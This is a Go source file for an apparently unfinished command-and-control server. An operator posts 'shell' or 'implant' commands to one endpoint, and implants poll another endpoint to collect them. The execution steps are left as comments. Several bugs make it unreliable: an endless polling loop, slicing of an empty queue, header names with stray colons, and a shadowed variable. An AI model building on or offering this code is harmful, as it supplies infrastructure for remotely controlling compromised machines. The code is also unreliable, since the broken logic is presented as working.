package main
import (
    "fmt"
	"log"
	"net/http"
	"net"
)

var err error
var serverIP string
var ip string

var commandQueue [][]string 

func main() {
    // Get the server's IP address

    // Start the server in a goroutine
    go startServer()

    select {}
}

func startServer() {
    http.HandleFunc("/test", sendCMD)
    http.HandleFunc("/operator", handleOperator)
    serverIP, err := getServerIP()
    if err != nil {
        log.Fatal("Error:", err)
    }
    // Get the server's IP address
    if serverIP == "" {
        log.Fatal("Failed to determine server IP address")
    }
    fmt.Printf("Server started at http://%s:8443\n", serverIP)
	// Server configuration
	server := http.Server{
		Addr:      ":8443",
	}

	// Serve
    err = server.ListenAndServe()
    defer server.Close()
}

func getServerIP() (string, error) {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return "", fmt.Errorf("failed to retrieve interface addresses: %v", err)
    }

    for _, addr := range addrs {
        ipnet, ok := addr.(*net.IPNet)
        if !ok {
            continue
        }
        if ipnet.IP.IsGlobalUnicast() && ipnet.IP.To4() != nil {
			serverIP = ipnet.IP.String()
            return ipnet.IP.String(), nil
        }
    }
    return "", fmt.Errorf("unable to determine server IP address")
}

func sendCMD(w http.ResponseWriter, r *http.Request) {
    for {
        if len(commandQueue) > 0 {
            // Get the first command pair from the queue
            cmdPair := commandQueue[0]
            cmdGroup := cmdPair[0]
            cmdString := cmdPair[1]
            // Define the response body as a string
            responseBody := "cmdGroup:" + cmdGroup + "\n" +
            "cmdString:" + cmdString

            // Set Content-Type header
            w.Header().Set("Content-Type:", "text/plain")

            // Set Content-Length header
            w.Header().Set("Content-Length:", fmt.Sprint(len(responseBody)))

            // Write the status code
            w.WriteHeader(http.StatusOK)

            // Write the response body
            fmt.Fprintf(w, responseBody)
        }
            // Remove the processed command pair from the queue
            commandQueue = commandQueue[1:]
    }
}

func handleOperator(w http.ResponseWriter, r *http.Request) {
    fmt.Println("received request")
    // Only allow POST requests
    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }

    // Parse form data
    err := r.ParseForm()
    if err != nil {
        http.Error(w, "Failed to parse form", http.StatusBadRequest)
        return
    }

    // Get cmdGroup and cmdString from form data
    cmdGroup := r.Form.Get("cmdGroup")
    cmdString := r.Form.Get("cmdString")

    // Store the command in the global commands array
    commandQueue = append(commandQueue, []string{cmdGroup, cmdString})

    // Handle the command based on cmdGroup
    switch cmdGroup {
    case "shell":
        // Handle shell commands
        fmt.Printf("Executing shell command: %s\n", cmdString)
        // Execute shell command here
    case "implant":
        // Handle implant commands
        fmt.Printf("Executing implant command: %s\n", cmdString)
        // Execute implant command here
    default:
        http.Error(w, "Invalid cmdGroup", http.StatusBadRequest)
        return
    }

    // Send response
    w.WriteHeader(http.StatusOK)
    fmt.Fprintf(w, "Command received: %s %s", cmdGroup, cmdString)
}